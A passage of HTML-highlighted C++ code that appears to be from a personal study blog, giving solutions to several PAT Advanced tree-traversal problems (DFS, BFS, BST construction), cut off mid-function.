class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d%lf%lf&quot;</span>,&amp;n,&amp;p,&amp;r);</span><br><span class="line">    r/=<span class="number">100</span>;</span><br><span class="line">    <span class="keyword">int</span> sum,root;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;sum);</span><br><span class="line">        <span class="keyword">if</span>(sum!=<span class="number">0</span>)&#123;</span><br><span class="line">            <span class="keyword">int</span> temp;</span><br><span class="line">            <span class="keyword">while</span>(sum--)&#123;</span><br><span class="line">                <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;temp);</span><br><span class="line">                Node[i].child.push_back(temp);</span><br><span class="line">                HashTable[temp]=<span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">int</span> temp;</span><br><span class="line">            <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;temp);  <span class="comment">//weight</span></span><br><span class="line">            Node[i].data=temp;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//find root</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(HashTable[i]==<span class="literal">true</span>)&#123;</span><br><span class="line">            root=i;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    DFS(root,<span class="number">0</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%.1f\n&quot;</span>,p*ans);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">//PAT A1090</span></span><br><span class="line"><span class="comment">const int maxn=100010;</span></span><br><span class="line"><span class="comment">vector&lt;int&gt; child[maxn];</span></span><br><span class="line"><span class="comment">double p,r;</span></span><br><span class="line"><span class="comment">int maxdepth=0,num=0;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">void DFS(int index,int depth)</span></span><br><span class="line"><span class="comment">&#123;</span></span><br><span class="line"><span class="comment">    if(child[index].size()==0)&#123;</span></span><br><span class="line"><span class="comment">        if(depth&gt;maxdepth)&#123;</span></span><br><span class="line"><span class="comment">            maxdepth=depth;</span></span><br><span class="line"><span class="comment">            num=1;</span></span><br><span class="line"><span class="comment">        &#125;</span></span><br><span class="line"><span class="comment">        else if(depth==maxdepth)</span></span><br><span class="line"><span class="comment">            num++;</span></span><br><span class="line"><span class="comment">        return;</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment">    for(int i=0;i&lt;child[index].size();i++)&#123;</span></span><br><span class="line"><span class="comment">        DFS(child[index][i],depth+1);</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">int main()</span></span><br><span class="line"><span class="comment">&#123;</span></span><br><span class="line"><span class="comment">    int n;</span></span><br><span class="line"><span class="comment">    int temp,root;</span></span><br><span class="line"><span class="comment">    scanf(&quot;%d%lf%lf&quot;,&amp;n,&amp;p,&amp;r);</span></span><br><span class="line"><span class="comment">    r/=100;</span></span><br><span class="line"><span class="comment">    for(int i=0;i&lt;n;i++)&#123;</span></span><br><span class="line"><span class="comment">        scanf(&quot;%d&quot;,&amp;temp);</span></span><br><span class="line"><span class="comment">        if(temp!=-1)&#123;</span></span><br><span class="line"><span class="comment">            child[temp].push_back(i);</span></span><br><span class="line"><span class="comment">        &#125;</span></span><br><span class="line"><span class="comment">        else root=i;</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment">    DFS(root,0);</span></span><br><span class="line"><span class="comment">    printf(&quot;%.2f %d\n&quot;,p*pow(1+r,maxdepth),num);</span></span><br><span class="line"><span class="comment">    return 0;</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<hr>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;math.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;set&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;map&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stack&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;queue&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//PAT A1094</span></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> maxn=<span class="number">101</span>;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">node</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">int</span> num;  <span class="comment">//num of children</span></span><br><span class="line">    <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; child;</span><br><span class="line">    <span class="keyword">int</span> layer=<span class="number">1</span>;</span><br><span class="line">&#125;Node[maxn];</span><br><span class="line"></span><br><span class="line"><span class="keyword">bool</span> HashTable[maxn]; <span class="comment">//is root or not</span></span><br><span class="line"><span class="keyword">int</span> maxsum=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">int</span> maxge=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">int</span> level[maxn]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">BFS</span><span class="params">(<span class="keyword">int</span> index)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">queue</span>&lt;node&gt; q;</span><br><span class="line">    q.push(Node[index]);</span><br><span class="line">    <span class="keyword">while</span>(!q.empty())&#123;</span><br><span class="line">        node now=q.front();</span><br><span class="line">        q.pop();</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;now.child.size();i++)&#123;</span><br><span class="line">            Node[now.child[i]].layer=now.layer+<span class="number">1</span>;</span><br><span class="line">            q.push(Node[now.child[i]]);</span><br><span class="line">            level[now.layer+<span class="number">1</span>]++;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n,m,k,id;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d%d&quot;</span>,&amp;n,&amp;m);</span><br><span class="line">    <span class="keyword">if</span>(n==<span class="number">1</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;1 1\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++) HashTable[i]=<span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">while</span>(m--)&#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d%d&quot;</span>,&amp;id,&amp;k);</span><br><span class="line">        <span class="comment">//printf(&quot;%d %d\n&quot;,id,k);</span></span><br><span class="line">        Node[id].num=k;</span><br><span class="line">        <span class="keyword">while</span>(k--)&#123;</span><br><span class="line">            <span class="keyword">int</span> temp;</span><br><span class="line">            <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;temp);</span><br><span class="line">            <span class="comment">//printf(&quot;%d\n&quot;,temp);</span></span><br><span class="line">            Node[id].child.push_back(temp);</span><br><span class="line">            HashTable[temp]=<span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    for(int i=1;i&lt;=n;i++)&#123;</span></span><br><span class="line"><span class="comment">        for(int j=0;j&lt;Node[i].num;j++)&#123;</span></span><br><span class="line"><span class="comment">            printf(&quot;%d &quot;,Node[i].child[j]);</span></span><br><span class="line"><span class="comment">        &#125;</span></span><br><span class="line"><span class="comment">        printf(&quot;\n&quot;);</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="comment">//find root</span></span><br><span class="line">    <span class="keyword">int</span> root;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(HashTable[i]==<span class="literal">true</span>)&#123;</span><br><span class="line">            root=i;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    BFS(root);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(maxsum&lt;level[i])&#123;</span><br><span class="line">            maxsum=level[i];</span><br><span class="line">            maxge=i;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d %d\n&quot;</span>,maxsum,maxge);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<hr>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;math.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;set&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;map&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stack&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;queue&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//PAT A1106</span></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> maxn=<span class="number">100010</span>;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">node</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">int</span> data=<span class="number">-1</span>;</span><br><span class="line">    <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; child;</span><br><span class="line">&#125;Node[maxn];</span><br><span class="line"><span class="keyword">bool</span> HashTable[maxn];  <span class="comment">//是否为根结点</span></span><br><span class="line"><span class="keyword">int</span> n=<span class="number">0</span>,num=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">double</span> p,r,ans=<span class="number">1e12</span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">DFS</span><span class="params">(<span class="keyword">int</span> index,<span class="keyword">int</span> depth)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(Node[index].child.size()==<span class="number">0</span>)&#123;</span><br><span class="line">        <span class="keyword">double</span> price = p*<span class="built_in">pow</span>(<span class="number">1</span>+r,depth);</span><br><span class="line">        <span class="keyword">if</span>(price&lt;ans)&#123;</span><br><span class="line">            ans=price;</span><br><span class="line">            num=<span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(price==ans)&#123;</span><br><span class="line">            num++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;Node[index].child.size();i++)&#123;</span><br><span class="line">        DFS(Node[index].child[i],depth+<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d%lf%lf&quot;</span>,&amp;n,&amp;p,&amp;r);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++) HashTable[i]=<span class="literal">true</span>;</span><br><span class="line">    r/=<span class="number">100</span>;</span><br><span class="line">    <span class="keyword">int</span> sum,root;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;sum);</span><br><span class="line">        <span class="keyword">if</span>(sum!=<span class="number">0</span>)&#123;</span><br><span class="line">            <span class="keyword">int</span> temp;</span><br><span class="line">            <span class="keyword">while</span>(sum--)&#123;</span><br><span class="line">                <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;temp);</span><br><span class="line">                Node[i].child.push_back(temp);</span><br><span class="line">                HashTable[temp]=<span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//find root</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(HashTable[i]==<span class="literal">true</span>)&#123;</span><br><span class="line">            root=i;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    DFS(root,<span class="number">0</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%.4f %d\n&quot;</span>,ans,num);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<hr>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;math.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;set&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;map&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stack&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;queue&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//PAT A1053</span></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> MAXN=<span class="number">110</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">node</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">int</span> weight;</span><br><span class="line">    <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; child;</span><br><span class="line">&#125;Node[MAXN];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">cmp</span><span class="params">(<span class="keyword">int</span> a,<span class="keyword">int</span> b)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> Node[a].weight&gt;Node[b].weight;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> n,m,s;</span><br><span class="line"><span class="keyword">int</span> path[MAXN];</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">DFS</span><span class="params">(<span class="keyword">int</span> index,<span class="keyword">int</span> numNode,<span class="keyword">int</span> sum)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(sum&gt;s) <span class="keyword">return</span>;</span><br><span class="line">    <span class="keyword">if</span>(sum==s)&#123;</span><br><span class="line">        <span class="keyword">if</span>(Node[index].child.size()!=<span class="number">0</span>) <span class="keyword">return</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;numNode;i++)&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>,Node[path[i]].weight);</span><br><span class="line">            <span class="keyword">if</span>(i&lt;numNode<span class="number">-1</span>) <span class="built_in">printf</span>(<span class="string">&quot; &quot;</span>);</span><br><span class="line">            <span class="keyword">else</span> <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;Node[index].child.size();i++)&#123;</span><br><span class="line">        <span class="keyword">int</span> child = Node[index].child[i];</span><br><span class="line">        path[numNode]=child;</span><br><span class="line">        DFS(child,numNode+<span class="number">1</span>,sum+Node[child].weight);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d%d%d&quot;</span>,&amp;n,&amp;m,&amp;s);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;Node[i].weight);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> id,k,child;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;m;i++)&#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d%d&quot;</span>,&amp;id,&amp;k);</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;k;j++)&#123;</span><br><span class="line">            <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;child);</span><br><span class="line">            Node[id].child.push_back(child);</span><br><span class="line">        &#125;</span><br><span class="line">        sort(Node[id].child.begin(),Node[id].child.end(),cmp);</span><br><span class="line">    &#125;</span><br><span class="line">    path[<span class="number">0</span>]=<span class="number">0</span>;</span><br><span class="line">    DFS(<span class="number">0</span>,<span class="number">1</span>,Node[<span class="number">0</span>].weight);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">//PAT A1004</span></span><br><span class="line"><span class="comment">const int N=110;</span></span><br><span class="line"><span class="comment">vector&lt;int&gt; G[N];</span></span><br><span class="line"><span class="comment">int leaf[N]=&#123;0&#125;;</span></span><br><span class="line"><span class="comment">int max_h=1;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">void DFS(int index,int h)</span></span><br><span class="line"><span class="comment">&#123;</span></span><br><span class="line"><span class="comment">    max_h = max(h,max_h);</span></span><br><span class="line"><span class="comment">    if(G[index].size()==0)&#123;</span></span><br><span class="line"><span class="comment">        leaf[h]++;</span></span><br><span class="line"><span class="comment">        return;</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment">    for(int i=0;i&lt;G[index].size();i++)&#123;</span></span><br><span class="line"><span class="comment">        DFS(G[index][i],h+1);</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">int main()</span></span><br><span class="line"><span class="comment">&#123;</span></span><br><span class="line"><span class="comment">    int n,m,parent,child,k;</span></span><br><span class="line"><span class="comment">    scanf(&quot;%d%d&quot;,&amp;n,&amp;m);</span></span><br><span class="line"><span class="comment">    for(int i=0;i&lt;m;i++)&#123;</span></span><br><span class="line"><span class="comment">        scanf(&quot;%d%d&quot;,&amp;parent,&amp;k);</span></span><br><span class="line"><span class="comment">        for(int j=0;j&lt;k;j++)&#123;</span></span><br><span class="line"><span class="comment">            scanf(&quot;%d&quot;,&amp;child);</span></span><br><span class="line"><span class="comment">            G[parent].push_back(child);</span></span><br><span class="line"><span class="comment">        &#125;</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment">    DFS(1,1);</span></span><br><span class="line"><span class="comment">    printf(&quot;%d&quot;,leaf[1]);</span></span><br><span class="line"><span class="comment">    for(int i=2;i&lt;=max_h;i++)</span></span><br><span class="line"><span class="comment">        printf(&quot; %d&quot;,leaf[i]);</span></span><br><span class="line"><span class="comment">    return 0;</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="9-4"><a href="#9-4" class="headerlink" title="9.4"></a>9.4</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;math.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;set&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;map&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stack&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;queue&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//PAT A1043</span></span><br><span class="line"><span class="comment">//第一次写二叉排序，借鉴一下模板</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">node</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    node* rchild;</span><br><span class="line">    node* lchild;</span><br><span class="line">    <span class="keyword">int</span> data;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; origin,pre,preM,post,postM;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">insert</span><span class="params">(node* &amp;root,<span class="keyword">int</span> data)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(root==<span class="literal">NULL</span>)&#123;</span><br><span class="line">        root=<span class="keyword">new</span> node;</span><br><span class="line">        root-&gt;data=data;</span><br><span class="line">        root-&gt;lchild=root-&gt;rchild=<span class="literal">NULL</span>;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(data&lt;root-&gt;data) insert(root-&gt;lchild,data);</span><br><span class="line">    <span class="keyword">else</span> insert(root-&gt;rchild,data);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">preOrder</span><span class="params">(node* root,<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; vi)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(root==<span class="literal">NULL</span>) <span class="keyword">return</span>;</span><br><span class="line">    vi.push_back(root-&gt;data);</span><br><span class="line">    preOrder(root-&gt;lchild,vi);</span><br><span class="line">    preOrder(root-&gt;rchild,vi);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">preOrderMirror</span><span class="params">(node* root,<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; vi)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(root==<span class="literal">NULL</span>) <span class="keyword">return</span>;</span><br><span class="line">    vi.push_back(root-&gt;data);</span><br><span class="line">    preOrderMirror(root-&gt;rchild,vi);</span><br><span class="line">    preOrderMirror(root-&gt;lchild,vi);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">postOrder</span><span class="params">(node* root,<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; vi)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(root==<span class="literal">NULL</span>) <span class="keyword">return</span>;</span><br><span class="line">    postOrder(root-&gt;lchild,vi);</span><br><span class="line">    postOrder(root-&gt;rchild,vi);</span><br><span class="line">    vi.push_back(root-&gt;data);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">postOrderMirror</span><span class="params">(node* root,<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; vi)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(root==<span class="literal">NULL</span>) <span class="keyword">return</span>;</span><br><span class="line">    postOrderMirror(root-&gt;rchild,vi);</span><br><span class="line">    postOrderMirror(root-&gt;lchild,vi);</span><br><span class="line">    vi.push_back(root-&gt;data);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n,temp;</span><br><span class="line">    node* root=<span class="literal">NULL</span>;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;n);</span><br><span class="line">    